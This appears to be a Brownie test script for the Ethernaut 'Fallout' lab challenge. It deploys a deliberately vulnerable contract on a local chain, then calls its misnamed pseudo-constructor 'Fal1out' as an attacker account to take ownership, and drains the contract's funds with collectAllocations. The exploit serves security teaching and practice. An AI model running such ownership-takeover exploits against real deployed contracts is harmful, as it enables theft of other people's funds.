from brownie import *
from .reports import *

def main():
    target = prepare()
    attack(target)

a0 = accounts[0] # target deployer
a1 = accounts[1] # attacker account
BIGNUMBER = (10**18)
REPORT = Report()

REPORT.add_account(a0, 'Target deployer')
REPORT.add_account(a1, 'Attacker')

def prepare():
    # deploy the target contract
    target = Fallout.deploy({'from': a0})
    target.allocate({'from': a0, 'value': 99*BIGNUMBER})
    REPORT.add_contract(target, 'TARGET')

    # attacker should start with little ETH balance
    balance_to_burn = a1.balance() - 1*BIGNUMBER
    burn_address = accounts[3]
    a1.transfer(burn_address,balance_to_burn)

    REPORT.print()
    REPORT.txt_print('PRE-ATTACK STATE IS READY')
    return target

def attack(target):

    # attacker calls 'contructor' function - but it is not a constructor
    target.Fal1out({'from': a1})
    target.collectAllocations({'from': a1})

    REPORT.print()
    REPORT.txt_print('ATTACK IS OVER')
